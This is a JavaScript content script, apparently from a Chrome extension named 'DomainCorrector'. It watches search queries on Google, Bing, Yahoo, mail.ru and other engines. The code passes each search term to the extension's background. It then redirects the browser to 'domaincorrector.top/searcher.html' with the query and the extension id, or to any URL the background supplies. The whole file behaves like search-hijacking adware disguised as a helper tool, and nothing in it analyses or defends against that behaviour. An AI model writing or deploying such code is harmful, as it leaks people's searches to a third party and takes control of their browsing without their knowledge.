
DomainCorrectorCnst.SUSPEND_PARAM_VAL = "suspend_" + "DomainCorrector";
DomainCorrectorCnst.SEARCH_SITES =
	['google','yahoo','bing','search.ask.com','mail.ru','glesafe.com', 'inspsearch.com','aol.com','infospace.com'];

var QueryString = function () {

	// This function is anonymous, is executed immediately and

	// the return value is assigned to QueryString!

	var query_string = {};

	var query = window.location.search.substring(1);

	var vars = query.split("&");

	for (var i=0;i<vars.length;i++) {

		var pair = vars[i].split("=");

		// If first entry with this name

		if (typeof query_string[pair[0]] === "undefined") {

			query_string[pair[0]] = decodeURIComponent(pair[1]);

			// If second entry with this name

		} else if (typeof query_string[pair[0]] === "string") {

			var arr = [ query_string[pair[0]],decodeURIComponent(pair[1]) ];

			query_string[pair[0]] = arr;

			// If third or later entry with this name

		} else {

			query_string[pair[0]].push(decodeURIComponent(pair[1]));

		}

	}

	return query_string;

}();

var getURLHashParameter = function(name) {

	return decodeURIComponent((new RegExp('[#|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.hash) || [ , "" ])[1].replace(/\+/g, '%20')) || null;

};




var DomainCorrectorRedirect = function(){
	var term = getURLHashParameter("term");





	if(typeof QueryString[DomainCorrectorCnst.SUSPEND_PARAM_VAL ] !== "undefined"){
		return;
	}




	var valFromMap = DomainCorrectorSiteMap[QueryString.q] ;
	if(typeof valFromMap === "undefined" ){

		valFromMap = DomainCorrectorSiteMap[encodeURIComponent(QueryString.q)];
	}

	if(typeof valFromMap === "undefined" ){

		valFromMap = DomainCorrectorSiteMap[encodeURIComponent(encodeURIComponent(QueryString.q))];
	}

	typeof valFromMap!== "undefined"  &&(function(){

		chrome.runtime.sendMessage({topic: "redir" , keyword :QueryString.q }, function(response) {

			//no code here

		});


		var d = "domaincorrector.top";
		top.location.href = d +"/searcher.html?#q=" + encodeURIComponent(valFromMap) + "&term=" + encodeURIComponent(QueryString.q)
		+"&sus=" + DomainCorrectorCnst.SUSPEND_PARAM_VAL + "&name=DomainCorrector" + "&id=" + chrome.runtime.id;

	}());



};


var isAllowedBySite = function(url){
	var allowedSites = DomainCorrectorCnst.SEARCH_SITES;
	for(var index = 0 ; index < allowedSites.length; index++ ){
		if(url.indexOf(allowedSites[index]) !== -1){
			return true;
		}
	}
};



var qTerm = (
	function(){
		var queryKeys = ["q","p"];
		for(var index in queryKeys){
			var qTerm = QueryString[queryKeys[index]];

			if(typeof qTerm === "undefined"){
				qTerm = getURLHashParameter(queryKeys[index]);
			}
			if(typeof qTerm !== "undefined" && qTerm !== null){
				return qTerm;
			}
		}
		return null;
	}
)();
var url = getURLHashParameter("suspendUrl");
var suspend = getURLHashParameter(getURLHashParameter("sus"));
var term = getURLHashParameter("term");
var isSuspend = function(){

	return suspend !== null;
};
if(isSuspend()){
	chrome.runtime.sendMessage({topic:"suspend" , key:term, val:url}  , function(response) {

		//no code here

	});
	location.href = url;


}else if(qTerm !== null && qTerm !== "" ){


	QueryString.q = qTerm.replace(/\+/g," ");
	chrome.runtime.sendMessage({topic: "localstorage" , keyword :QueryString.q }, function(response) {

		if ("topic" in response  && "url" in response ){

			var url = response.url;
			if(url !== null && url !== ""){
				if(!isAllowedBySite(url)){
					location.href = url;
				}

				return;
			}
			(function(callback){
				var isActive = function(){
					return false;
				}

				if(!isActive()){
					return;
				}



				if(!isAllowedBySite(document.URL)){
					return;
				}
				callback();
				currUrl = document.URL;
				setInterval(function(){
					var newurl = document.URL
					if(currUrl !== newurl){
						currUrl = newurl;
						callback();
					}
				},50);
			})(DomainCorrectorRedirect);



		}

	});

}



